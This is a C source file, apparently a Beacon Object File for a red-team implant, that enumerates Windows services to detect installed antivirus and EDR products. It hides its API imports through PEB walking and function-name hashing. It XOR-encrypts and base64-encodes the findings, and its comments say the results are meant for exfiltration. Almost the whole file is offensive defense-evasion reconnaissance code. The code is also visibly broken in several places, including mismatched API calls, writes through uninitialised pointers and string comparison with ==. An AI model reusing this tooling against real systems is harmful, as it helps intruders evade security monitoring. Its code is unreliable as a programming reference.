/*
	To do 1: replace some WinAPIs for safer alternatives similar to C Runtime functions.
	To do 2: Utilize VX-API functions
	To do 3: Utilize function,string + variable (if applicable) obfuscations
	
  Credits:
    - John Hammond BOF Tutorial
	- @cocomelonc : MalDev for Ethical Hackers
	- Invoke-EDRChecker by PwnDexter (BOF version)
*/
#include "av-edr-recon-imports.h"
#include "av-edr-recon-structs.h"

#define XORKEY "helloWorld"

//BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
typedef SC_HANDLE (WINAPI * OpenSCManagerA_t)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
typedef BOOL 	  (WINAPI * CryptBinaryToStringA_t)(const BYTE *,DWORD,DWORD,LPSTR,DWORD *);
typedef BOOL 	  (WINAPI * EnumServicesStatusExA_t)(SC_HANDLE hSCManager,
												  SC_ENUM_TYPE InfoLevel,
												  DWORD dwServiceType,
												  DWORD dwServiceState,
												  LPBYTE lpServices,
												  DWORD cbBufSize,
												  LPDWORD pcbBytesNeeded,
												  LPDWORD lpServicesReturned,
												  LPDWORD lpResumeHandle,
												  LPCSTR pszGroupName);
typedef BOOL (WINAPI * CloseServiceHandle_t)(SC_HANDLE hSCObject);
typedef SC_HANDLE (WINAPI * OpenServiceA_t)(SC_HANDLE hSCManager,LPCSTR lpServiceName,DWORD dwDesiredAccess);
typedef BOOL (WINAPI * QueryServiceConfigA_t)(SC_HANDLE hService,LPQUERY_SERVICE_CONFIGA lpServiceConfig,DWORD cbBufSize,LPDWORD pcbBytesNeeded);

// define a struct to store process name and description
/*
typedef struct {
	char process_name[64];  // Sample Mapping { '0' : "System.exe" - "<description-here>" }
	char description[64];
} ProcessSt;
*/


int process_count = 0;


// To do: Hash this then do pattern matching [/]
// Hash version of each of the elemeent in the EDR list:
BYTE edrListHash[MAX_EDR_STRINGS][MAX_EDR_STRING_LENGTH] = {
    0xB3FD5047, 0x10BE3B80, 0xCEC62B78, 0xA9753030, 0xFCDF2DFB, 0x3364E832,
    0x2E607513, 0xC35A3871, 0x56AB9154, 0x90DDC059, 0x95C8AD2B, 0x99743B08,
    0x6956E076, 0x532D0FA3, 0x82AE14D1, 0x37C7C4DE, 0x221FBFA0, 0xE42B3419, 0x0AE93D3C,
    0x0A1CF1E8, 0x89A74222, 0xD1141413, 0xDEFA8DE2, 0x2726309F, 0x6D47D031,
    0xD7BA9168, 0x372A2FD5, 0xEB5E8677, 0xD41FA2BC, 0x9C49FEFF, 0x3054A96F, 0x51F33DA7,
    0xBFAAD84C, 0x9B7E5031, 0xA5FF8C77, 0x5CF079CB, 0x58B40427, 0x53C4431A, 0x4A3B003D, 0xE21F36F8,
    0x8600086F, 0x4488374C, 0x6D4FEF89, 0x5F36EFF6, 0xCD7EDAE6, 0xB67A5FD7, 0x57445D43,
    0xAA505F5F, 0xC83C713B, 0x838C96FC, 0x30663827, 0x9EB55D2F, 0x460D9F75, 0xFC15FCC7,
    0x08EC76F5, 0x6333E7A4, 0xF72C02CD, 0x32CAF50F, 0x764B1EFA, 0xAF2AD9F1, 0x6E8EBA96,
    0x6786246A, 0x3B929DF3, 0xBA69C2A6, 0x947D93D0, 0x7DDCAE11, 0xFE9EC656, 0x7106E371,
    0x2199DD77, 0x1CCED17E, 0x2AE007A6, 0x3647CD87, 0x90057D07, 0x1A10642D, 0x25A03C3E, 0x52A20062, 0xE32142D9, 0xDC963EF8,
    0x2E3D2230, 0x246B7B6C, 0xDB9D21B8, 0xD99C2996, 0xAE9AE6B4, 0xC08DF999,
    0x5F79C5AF, 0x6C0DE72B, 0xDF4C8F49, 0x7484565D, 0x6B33A43B, 0xF9DE29CE, 0x652B9591,
    0x5EA92173, 0x1DFA51AD, 0xC367BC2C, 0x7A83BFF0, 0x58FF8564,
    0x5AD80150, 0x72ED6534, 0x448778D9, 0x1AFCB807, 0xB25C5F4C, 0x7C9707D3, 0x82BCDF9F,
    0x6A8460D0, 0x15CECA17, 0x26C648E8, 0x44C73180, 0x958B0BD6, 0x79EFC8AF, 0x622D0048, 0x12553259,
    0xCD8B5458, 0xE6BF78B1, 0x32D102BA, 0xF2560E7F, 0x54026AB4, 0x3F96D8A0, 0xAAA8C8B2, 0x058D3FEF,
    0x339CEDB0, 0xA18664A7, 0xE6E11F2C, 0x3556E414, 0x2AE5E7C7, 0x2B578A26, 0x27D87DB5,
    0xA681F182, 0x0F2695D0 };


SIZE_T StringLengthA(LPCSTR String) {
    LPCSTR String2;

    if ( String == NULL )
        return 0;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}


void utf8_string_to_lower(BYTE* utf8_string_in, BYTE* utf8_string_out) {
    for (DWORD i = 0; utf8_string_in[i] != '\0'; i++)
    {
        if (utf8_string_in[i] >= 'A' && utf8_string_in[i] <= 'Z')
        {
            utf8_string_out[i] = utf8_string_in[i] - 'A' + 'a';
        }
        else
        {
            utf8_string_out[i] = utf8_string_in[i];
        }
    }
}

DWORD hash_ascii_string(BYTE* utf8_string)
{
    BYTE lower_string[256] = { 0 };
    DWORD  length = StringLengthA(utf8_string);
    utf8_string_to_lower(utf8_string, lower_string);
    BYTE prime  = 0xE3;
    BYTE seed   = 0xB0;
    BYTE offset = 0xBC;

    DWORD hash = (offset ^ seed);
    for (DWORD i = 0; i < length; ++i) {
        hash ^= (DWORD)lower_string[i];
        hash *= prime;
    }
    return hash;
}


// Func defn: Normal version of GetModuleHandle
// This function is equivalent to "loaded_module_base_from_hash" in BokuLoader.c
HMODULE WINAPI hlpGetModuleHandle(DWORD dllHash) {
	// get the offset of Process Environment Block
#ifdef _M_IX86
	_PEB * ProcEnvBlk = (_PEB *) __readfsdword(0x30);
#else
	_PEB * ProcEnvBlk = (_PEB *) __readgsqword(0x60);
#endif

	// return base address of a calling module
	if (!dllHash)
		return (HMODULE) (ProcEnvBlk->lpImageBaseAddress);

	PEB_LDR_DATA * Ldr = ProcEnvBlk->pLdr;
	LIST_ENTRY * ModuleList = NULL;
	
	// Caveat: Create a 'buffer' zone BEFORE using 'hlpGetModuleHandle' (e.g. xLoadLibrary() function)
	ModuleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY * pStartListEntry = ModuleList->Flink;

	for (LIST_ENTRY *  pListEntry  = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
					   pListEntry != ModuleList;	    	// walk all list entries
					   pListEntry  = pListEntry->Flink)	{
		
		// get current Data Table Entry
		LDR_DATA_TABLE_ENTRY * pEntry = (LDR_DATA_TABLE_ENTRY *) ((BYTE *) pListEntry - sizeof(LIST_ENTRY));

		// check if module is found and return its base address
		//if (StringCompareA((const char *) pEntry->BaseDllName.Buffer, (const char *) sModuleName) == 0)
		//	return (HMODULE) pEntry->DllBase;
		wchar_t* uniDllStr = (wchar_t*)pEntry->FullDllName.Buffer;
		size_t size = wcstombs(NULL,uniDllStr, 0);
		char* tmpDll = malloc(size + 1);
		wcstombs( tmpDll, uniDllStr, size + 1 );
		
		if( hash_ascii_string( (BYTE*) tmpDll ) == dllHash )
			return (HMODULE) pEntry->DllBase;
	}

	// otherwise:
	return NULL;
}


FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, DWORD apiHash) {
	unsigned char * pBaseAddr = (char *) hMod;
	
	// get pointers to main headers/structures
	IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) pBaseAddr;
	IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY * pExportDataDir = (IMAGE_DATA_DIRECTORY *) (&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY * pExportDirAddr = (IMAGE_EXPORT_DIRECTORY *) (pBaseAddr + pExportDataDir->VirtualAddress);

	// resolve addresses to Export Address Table, table of function names and "table of ordinals"
	DWORD * pEAT = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD * pFuncNameTbl = (DWORD *) (pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD * pHintsTbl = (WORD *) (pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

	// function address we're looking for
	void* pProcAddr = NULL;
	
	// ====================== Resolve function by name ======================
	// parse through table of function names
	for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
		unsigned char * sTmpFuncName = (char *) pBaseAddr + (DWORD_PTR) pFuncNameTbl[i];
		
		// What happens if the sProcName is found first?
		if (apiHash == hash_ascii_string(sTmpFuncName)) {
			// found, get the function virtual address = RVA + BaseAddr
			pProcAddr = (FARPROC) (pBaseAddr + (DWORD_PTR) pEAT[pHintsTbl[i]]);
			//printf("[*] Found the address for %s: %p\n", sTmpFuncName, pProcAddr);
			//MSVCRT$getchar();
			
			// jmp to 'sTmpFuncName'
			//char patch[14] = { 0 };
			//CopyMemoryEx(patch + 6, &pProcAddr, 8);
			//CopyMemoryEx(patch, "\xFF\x25", 2);
			
			//printf("After copying - patch: %p\n", patch);
			//MSVCRT$getchar();
			
			// Replace with CopyMemoryEx
			//CopyMemoryEx( (PVOID) pNtDelayExecution, (const PVOID)patch, sizeof(patch) );
			//printf("[*] After patching NtDelayExecution: %p\n", pNtDelayExecution);
			//MSVCRT$getchar();
			break;
		}
	}
	return pProcAddr;
}


FARPROC funcDynaLoad(HANDLE hModule, DWORD apiHash, PVOID pFuncAddr) {
	// Uses IAT Hiding
	pFuncAddr = hlpGetProcAddress(hModule, apiHash);
	
	if(!pFuncAddr) {
		//printf("[-] Failed to extract the function's entry point address.\n");
		return;
	}
	
	//printf("[*] Going out of funcDynaLoad()\n");
	//MSVCRT$getchar();
	return pFuncAddr;
}


BOOL Base64EncodeA(void** dest, unsigned long *dlen, void* src, unsigned long slen) {
	PVOID pFunction = NULL;
	pFunction = funcDynaLoad(hlpGetModuleHandle(BCRYPT), CRYPTBINARYTOSTRINGA, &pFunction);
	CryptBinaryToStringA_t CryptBinaryToStringA_p = (CryptBinaryToStringA_t)pFunction;
	
	if (!src)
		return FALSE;
	
	if(!CryptBinaryToStringA_p(src, slen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, dlen)){
		PRINT("[-] Failed to initialize encoding.\n");
		return FALSE;
	}
	
	if(!CryptBinaryToStringA_p(src, slen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *dest, dlen)){
		PRINT("[-] Failed to encode the memory block.\n");
		return FALSE;
	}
	
	return TRUE;
}

void XORcrypt(char str2xor[], size_t len, char key) {
/*
        XORcrypt() is a simple XOR encoding/decoding function
*/
    int i;

    for (i = 0; i < len; i++) {
        str2xor[i] = (BYTE)str2xor[i] ^ key;
    }
}


// Helper Functions
char bof_tolower(char c) {
    if (c >= 'A' && c <= 'Z') {
        return c + 32;
    }
    return c;
}


void toLower(char* str) {
    for (int i = 0; str[i]; i++) {
        str[i] = bof_tolower(str[i]);
    }
}


void safe_strncpy(char* dest, const char* src, size_t n) {
    size_t src_len = strlen(src);
    size_t copy_len = (src_len < n) ? src_len : n - 1;
    memcpy(dest, src, copy_len);
    dest[copy_len] = '\0';
}


int isEDRString(const char* str) {
	char lowerStr[MAX_PATH];
    safe_strncpy(lowerStr, str, MAX_PATH);
    toLower(lowerStr);
	DWORD tmpHash = hash_ascii_string(lowerStr);
	BYTE* hashedStr = (BYTE *)&tmpHash;
	char* fullHash = "0x";
	PRINT("[*] Received string: %s | %s | Hashed out: ",str,lowerStr);
	
	// Why tf it is printing out random shit
	PRINT("0x");
	for (int i = 3; i >= 0; i--) {
		char tmp[2];
		PRINT("%02X", hashedStr[i]);
		sprintf(tmp, "%02X", hashedStr[i]);
		strcat(fullHash, tmp);
	}
	PRINT("\nOut\n");
	
    for (int i = 0; i < MAX_EDR_STRINGS; i++) {
		if (fullHash == edrListHash[i])
            return 1;
    }
    return 0;
}


// OpenSCManagerA's desired access: (if not using the "all-access", I can use bitmasking in here.)
/*
	- SC_MANAGER_CONNECT 			// Connect to SCM
	- SC_MANAGER_CREATE_SERVICE 	// Create new services
	- SC_MANAGER_ENUMERATE_SERVICE	// Enumerate services
	- SC_MANAGER_LOCK				// Lock the service database (why?)
	- SC_MANAGER_QUERY_LOCK_STATUS	// Query lock status
	- SC_MANAGER_MODIFY_BOOT_CONFIG	// Modify boot configuration
	- SC_MANAGER_ALL_ACCESS			// Full access
*/
// Function 3 Defn: Checking services containing hints of an EDR
void checkServices() {
	char* collectedStr = "";
	PRINT("Checking services where EDR/AV artifacts can be found...\n");
	
	HMODULE hModule = hlpGetModuleHandle(NTDLL);
	HMODULE hAdvMod = hlpGetModuleHandle(ADVAPI32);
	OpenSCManagerA_t pOpenSCManagerA = NULL;
	FARPROC pFunction = funcDynaLoad(hModule, OPENSCMANAGERA, &pFunction);
	pOpenSCManagerA = (OpenSCManagerA_t)pFunction;

	// Open the service manager for the purpose of enumerating all the services in the system whether it is running or not.
    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, 
											NULL, 
											SC_MANAGER_ENUMERATE_SERVICE); 
    if (!hSCManager) {
        PRINT("[-] Failed to open Service Control Manager\n");
        return;
    }
	
    DWORD bytesNeeded = 0;
    DWORD servicesReturned = 0;
    DWORD resumeHandle = 0;
	
	
	// Call intent: to extract the number of services in the windows environment.
	// Enumerates services in the specified service control manager database.
	EnumServicesStatusExA_t pEnumServicesStatusExA = NULL;
	pFunction = funcDynaLoad(hModule, ENUMSERVICESSTATUSEXA, &pFunction);
	pEnumServicesStatusExA = (EnumServicesStatusExA_t)pFunction;
	
    pEnumServicesStatusExA(hSCManager, // Handle to the service manager
							SC_ENUM_PROCESS_INFO,   // to retrieve the NAME and SERVICE STATUS information for each service in the database.
							SERVICE_WIN32, 			// Services of type SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS.
							SERVICE_STATE_ALL, 		// Combines the SERVICE_ACTIVE and SERVICE_INACTIVE states. Enumerates both basically.
							NULL, 					// Specific service information is not needed. I just need to enumerate it.
							0,						// since the prev param is NULL, this is set to 0. This is the expected buffer size.
							&bytesNeeded, 			// Returns the number of bytes needed to return the remaining service entries.
							&servicesReturned, 		// Returns the number of service entries.
							&resumeHandle, 			// A pointer that specifies the starting point of enumeration.
							NULL);
    
	/*
		typedef struct _ENUM_SERVICE_STATUS_PROCESSA {
		  LPSTR                  lpServiceName;
		  LPSTR                  lpDisplayName;
		  SERVICE_STATUS_PROCESS ServiceStatusProcess;
		} ENUM_SERVICE_STATUS_PROCESSA, *LPENUM_SERVICE_STATUS_PROCESSA;
		
		typedef struct _SERVICE_STATUS_PROCESS {
		  DWORD dwServiceType;				// (SERVICE_FILE_SYSTEM_DRIVER) The service is a file system driver. | (SERVICE_KERNEL_DRIVER) The service is a device driver. | (SERVICE_WIN32_OWN_PROCESS) The service runs in its own process. | (SERVICE_WIN32_SHARE_PROCESS) The service shares a process with other services.
		  DWORD dwCurrentState;				// SERVICE_CONTINUE_PENDING | SERVICE_PAUSE_PENDING | SERVICE_PAUSED | SERVICE_RUNNING | SERVICE_START_PENDING | SERVICE_STOP_PENDING | SERVICE_STOPPED
		  DWORD dwControlsAccepted; 		// 
		  DWORD dwWin32ExitCode;			// 
		  DWORD dwServiceSpecificExitCode;	// 
		  DWORD dwCheckPoint;				// 
		  DWORD dwWaitHint;					// 
		  DWORD dwProcessId;				// 
		  DWORD dwServiceFlags;				// 
		} SERVICE_STATUS_PROCESS, *LPSERVICE_STATUS_PROCESS;
	*/
	// This structure contains the metadata for each of the service from the entries extracted. This is going to be the buffer later for storing services information.
	ENUM_SERVICE_STATUS_PROCESSA* services = (ENUM_SERVICE_STATUS_PROCESSA*)malloc(bytesNeeded); 	// The number of bytes allocated depends on the number of service entries extracted.
    if (services == NULL) {
        PRINT("[-] Failed to allocate memory for services\n");
        CloseServiceHandle_t pCloseServiceHandle = NULL;
		pFunction = funcDynaLoad(hModule, CLOSESERVICEHANDLE, &pFunction);
		pCloseServiceHandle = (CloseServiceHandle_t)pFunction;
		pCloseServiceHandle(hSCManager);
        return;
    }
	
    if (!pCloseServiceHandle(hSCManager, 
							SC_ENUM_PROCESS_INFO, // to retrieve the NAME and SERVICE STATUS information for each service in the database.
							SERVICE_WIN32, 		  // Services of type SERVICE_WIN32_OWN_PROCESS | SERVICE_WIN32_SHARE_PROCESS.
							SERVICE_STATE_ALL, 	  // Combines the SERVICE_ACTIVE and SERVICE_INACTIVE states. Enumerates both basically.
							(LPBYTE)services, 	  // This is the buffer later for storing services information. 
							bytesNeeded,
							&bytesNeeded, 
							&servicesReturned, 	  // Returns the number of service entries.
							&resumeHandle, 		  // The enumeration starts at the very first service entry.
							NULL)) {
        PRINT("[-] Failed to enumerate services\n");
        free(services);

        CloseServiceHandle_t pCloseServiceHandle = NULL;
		pFunction = funcDynaLoad(hModule, CLOSESERVICEHANDLE, &pFunction);
		pCloseServiceHandle = (CloseServiceHandle_t)pFunction;
		pCloseServiceHandle(hSCManager);
        return;
    }
    
	
	/*
		SC_HANDLE OpenServiceA(
		  SC_HANDLE hSCManager,
		  LPCSTR    lpServiceName,
		  DWORD     dwDesiredAccess
		);
	*/
	int foundSuspicious = 0;
	OpenServiceA_t pOpenServiceA = NULL;
	pFunction = funcDynaLoad(hModule, OPENSERVICEA, &pFunction);
	pOpenServiceA = (OpenServiceA_t)pFunction;
	
    for (DWORD i = 0; i < servicesReturned; i++) {
        SC_HANDLE hService = pOpenServiceA(hSCManager, 
										services[i].lpServiceName, 
										SERVICE_QUERY_CONFIG); // allows to read a service's configuration. Alternative APIs: QueryServiceConfigA() -> however, this API already presumes the handle to the service is already open.
        if (hService) {
            DWORD bytesNeeded = 0;
			QueryServiceConfigA_t pQueryServiceConfigA = NULL;
			pFunction = funcDynaLoad(hModule, QUERYSERVICECONFIGA, &pFunction);
			pQueryServiceConfigA = (QueryServiceConfigA_t)pFunction;
	
			// This API queries the amount of bytes needed to store the information for the service configuration.
            pQueryServiceConfigA(hService, 
								NULL, 
								0, 
								&bytesNeeded); // number of bytes needed to store all the configuration information
			
			// Whats "LoadOrderGroup"? => The startup program uses load ordering groups to load groups of services in a specified order with respect to the other groups. 
			// The list of load ordering groups is contained in the following registry value:
			// HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ServiceGroupOrder

			/*
				typedef struct _QUERY_SERVICE_CONFIGA {
				  DWORD dwServiceType; 	 	// (SERVICE_FILE_SYSTEM_DRIVER) The service is a file system driver. | (SERVICE_KERNEL_DRIVER) The service is a device driver. | (SERVICE_WIN32_OWN_PROCESS) The service runs in its own process. | (SERVICE_WIN32_SHARE_PROCESS) The service shares a process with other services.
				  DWORD dwStartType;		// SERVICE_AUTO_START | SERVICE_BOOT_START (driver services) | SERVICE_DEMAND_START | SERVICE_DISABLED | SERVICE_SYSTEM_START
				  DWORD dwErrorControl;		// SERVICE_ERROR_CRITICAL | SERVICE_ERROR_IGNORE | SERVICE_ERROR_NORMAL | SERVICE_ERROR_SEVERE
				  LPSTR lpBinaryPathName;	// The fully qualified path to the service binary file.
				  LPSTR lpLoadOrderGroup;	// The name of the load ordering group to which this service belongs
				  DWORD dwTagId;
				  LPSTR lpDependencies;
				  LPSTR lpServiceStartName;
				  LPSTR lpDisplayName;
				} QUERY_SERVICE_CONFIGA, *LPQUERY_SERVICE_CONFIGA;
			*/
			// This is the structure of the buffer to contain the service configuration.
            QUERY_SERVICE_CONFIGA* pServiceConfig = (QUERY_SERVICE_CONFIGA*)malloc(bytesNeeded);
            if (pServiceConfig != NULL) {
                if (pQueryServiceConfigA(hService, pServiceConfig, bytesNeeded, &bytesNeeded)) { // Returns the service configuration in the buffer (2nd param)
                    char serviceInfo[MAX_PATH * 3];
                    sprintf(serviceInfo, "%s - %s - %s",
                        services[i].lpServiceName,
                        services[i].lpDisplayName,
                        pServiceConfig->lpBinaryPathName);
                    if (isEDRString(services[i].lpServiceName)) { // Checks if the "serviceInfo" (service-name to be exact) matches atleast one EDR in the list of security solutions.
                        strcat(collectedStr, "[!] Suspicious service found:\n");
                        char* strTmp1;
						sprintf(strTmp1, "\tName: %s\n", services[i].lpServiceName);
						strcat(collectedStr, strTmp1);
						
						char* strTmp2;
                        sprintf(strTmp2, "\tDisplay Name: %s\n", services[i].lpDisplayName);
						strcat(collectedStr, strTmp2);
						
						char* strTmp3;
                        sprintf(strTmp3, "\tBinary Path: %s\n\n", pServiceConfig->lpBinaryPathName);
						strcat(collectedStr, strTmp3);
                        foundSuspicious = 1;
                    }
                }
                free(pServiceConfig);
            }
			CloseServiceHandle_t pCloseServiceHandle = NULL;
			pFunction = funcDynaLoad(hModule, CLOSESERVICEHANDLE, &pFunction);
			pCloseServiceHandle = (CloseServiceHandle_t)pFunction;
			pCloseServiceHandle(hSCManager);
            CloseServiceHandle(hService);
        }
    }
	
	// XOR encrypts the collected information to be exfiltrated
	XORcrypt((char *) collectedStr, strlen(collectedStr), XORKEY);

	// To do: Base64 encode the XOR encrypted information
	Base64EncodeA(&collectedStr, strlen(collectedStr), collectedStr, strlen(collectedStr));

	// To do: Create a blob file containing the encoded + encrypted information
	// Use WinAPI for file creation in here!
	
    free(services);
    CloseServiceHandle_t pCloseServiceHandle = NULL;
	pFunction = funcDynaLoad(hModule, CLOSESERVICEHANDLE, &pFunction);
	pCloseServiceHandle = (CloseServiceHandle_t)pFunction;
	pCloseServiceHandle(hSCManager);
    if (!foundSuspicious)
        PRINT("[+] No suspicious services found\n\n");
	return;
}


#ifdef BOF
// BOF Defn: Make sure to execute only one of the EDR enumeration vector at a time.
// Use case: av-edr-recon <procList> <enumProcs | checkDirectories | checkServices>
void go(char *args, int alen) {
	PRINT("[+] Listing processes..\n");
	
	// TODO: Fix the Beacon string input processing
	/*datap parser;
	char* proclist;
	
	// Prepare data parser
	BeaconDataParse(&parser, args, alen);
	
	// Unpack Data
	proclist = BeaconDataExtract(&parser, NULL);
	
	HANDLE hHeap = KERNEL32$GetProcessHeap();
	*/
	
	// Tip: Encrypt the process list on-disk then decrypt it on runtime
	// Proclist should be the first argument in here.
	// This Harcoded string is only used for testing.
	checkServices();

	// To do 1: Encrypt the information to a .bmp file with a simple AES encryption
	// To do 2: To be exfiltrated by a different BOF capability (BMP)
	
	
	return;
}

#else

int main() {
	checkServices();
	return 0;
}

#endif